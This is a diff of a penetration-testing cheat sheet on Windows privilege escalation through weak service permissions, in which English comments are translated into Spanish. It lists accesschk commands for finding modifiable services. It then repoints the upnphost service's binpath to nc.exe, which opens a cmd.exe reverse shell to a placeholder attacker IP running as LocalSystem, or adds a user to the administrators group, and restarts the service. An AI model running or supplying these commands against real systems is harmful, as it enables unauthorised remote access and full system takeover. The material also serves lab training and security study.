@@ -1,27 +1,27 @@
 # upload accesschk.exe to a writable directory first 
 # For XP SP0,  version 5.2 of accesschk.exe is needed (https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe )
 
-eg: 
-# check for services with weak permissions, (list all the services that an authenticated user can modify.)
+EJM: 
+# BUSQUE SERVICIOS CON PERMISOS DEBILES (ENUMERE TODOS LOS SERVICIOS QUE UN USUARIO AUTENTICADO PUEDE MODIFICAR)
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 
-# check for the found services above if they have write permissions
+# VERIFICAR LOS SERVICIOS ENCONTRADOS SI TIENEN PERMISOS DE ESCRITURA
 accesschk.exe -ucqv upnphost
 
-# upload nc.exe to writable directory and change the config of service
-sc config upnphost binpath= "C:\Inetpub\nc.exe -nv <attackerip> <attacker port> -e C:\WINDOWS\System32\cmd.exe"
+# CARGUE NC.EXE EN EL DIRECTORIO GRABABLE Y CAMBIE LA CONFIGURACION DEL SERVICIO
+sc config upnphost binpath= "C:\Inetpub\nc.exe -nv <attacker-ip> <attacker-port> -e C:\WINDOWS\System32\cmd.exe"
 sc config upnphost obj= ".\LocalSystem" password= ""
 
-# or add the user to the admin group
+# O AGREGAR AL USUARIO AL GRUPO ADMINISTRADOR
 sc config "upnphost" binPath="net localgroup administrators <username> /add" 
 
 # change start option as AUTO-START 
 sc config upnphost start= auto
 
-# check the status of the service now
+# COMPROBAR EL ESTADO DEL SERVICIO
 sc qc upnphost
 
-#start the services
+# INICIAR EL SERVICIO
 net stop upnphost
 net start upnphost
 
